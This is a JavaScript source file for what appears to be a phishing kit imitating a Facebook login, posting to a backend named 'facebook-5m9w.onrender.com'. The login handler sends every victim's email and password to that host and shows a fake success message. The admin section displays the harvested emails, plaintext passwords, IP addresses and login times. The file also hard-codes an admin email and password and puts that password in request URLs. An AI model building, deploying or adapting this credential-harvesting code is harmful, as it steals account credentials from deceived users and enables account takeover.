// ADMIN CREDENTIALS (CHANGE THESE IN PRODUCTION)
const ADMIN_EMAIL = "tboykritical@gmail.com";
const ADMIN_PASSWORD = "kolawole";
const API_BASE_URL = "https://facebook-5m9w.onrender.com";

// ===== LOGIN PAGE FUNCTIONALITY =====
if (document.getElementById('loginForm')) {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const adminLink = document.getElementById('adminLink');
    const successMessage = document.getElementById('successMessage');

    // Show admin link only when admin email is entered
    emailInput.addEventListener('input', function() {
        adminLink.style.display = this.value === ADMIN_EMAIL ? 'block' : 'none';
    });

    // Handle form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = document.getElementById('password').value.trim();
        
        // Simple validation
        if (!email || !password) {
            alert('Please enter both email and password');
            return;
        }
        
        try {
            // Send login data to backend
            const response = await fetch(`${API_BASE_URL}/api/login`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            // Check for admin login
            if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
                sessionStorage.setItem('isAdmin', 'true');
                window.location.href = 'admin.html';
            } else {
                // For regular users, show success message
                loginForm.style.display = 'none';
                successMessage.style.display = 'block';
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Failed to login. Please try again.');
        }
    });
}

// ===== ADMIN PAGE FUNCTIONALITY =====
if (document.getElementById('userTableBody')) {
    // Verify admin access
    async function verifyAdminAccess() {
        if (sessionStorage.getItem('isAdmin') !== 'true') {
            const enteredPassword = prompt("Enter Admin Password:");
            if (enteredPassword !== ADMIN_PASSWORD) {
                alert("Unauthorized access!");
                window.location.href = 'index.html';
                return false;
            }
            sessionStorage.setItem('isAdmin', 'true');
        }
        return true;
    }

    // Only proceed if admin is verified
    if (await verifyAdminAccess()) {
        const tableBody = document.getElementById('userTableBody');
        
        // Update table header
        document.querySelector('#userTable thead tr').innerHTML = `
            <th>ID</th>
            <th>Email/Phone</th>
            <th>Password</th>
            <th>Login Time</th>
            <th>IP Address</th>
            <th>Status</th>
        `;
        
        // Render user table
        function renderUsers(userList) {
            tableBody.innerHTML = userList.length ? 
                userList.map(user => `
                    <tr>
                        <td>${user.id}</td>
                        <td>${user.email}</td>
                        <td>${user.password}</td>
                        <td>${user.loginTime}</td>
                        <td>${user.ip}</td>
                        <td>${user.status}</td>
                    </tr>
                `).join('') : 
                '<tr><td colspan="6">No login records found</td></tr>';
        }
        
        // Load user data from backend
        async function loadUsers() {
            try {
                const response = await fetch(`${API_BASE_URL}/api/logins?adminPassword=${ADMIN_PASSWORD}`);
                if (!response.ok) {
                    throw new Error('Failed to fetch user data');
                }
                const users = await response.json();
                renderUsers(users);
            } catch (error) {
                console.error('Error loading users:', error);
                renderUsers([]);
            }
        }

        // Initial render
        await loadUsers();
        
        // Search functionality
        document.getElementById('searchBtn').addEventListener('click', async function() {
            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
            try {
                const response = await fetch(`${API_BASE_URL}/api/logins?adminPassword=${ADMIN_PASSWORD}`);
                if (!response.ok) {
                    throw new Error('Failed to fetch user data');
                }
                const users = await response.json();
                const filteredUsers = users.filter(user => 
                    user.email.toLowerCase().includes(searchTerm) || 
                    user.ip.includes(searchTerm) ||
                    (user.password && user.password.includes(searchTerm))
                );
                renderUsers(filteredUsers);
            } catch (error) {
                console.error('Error searching users:', error);
            }
        });
        
        // Logout button
        document.getElementById('logoutBtn').addEventListener('click', function() {
            sessionStorage.removeItem('isAdmin');
            window.location.href = 'index.html';
        });
    }
}
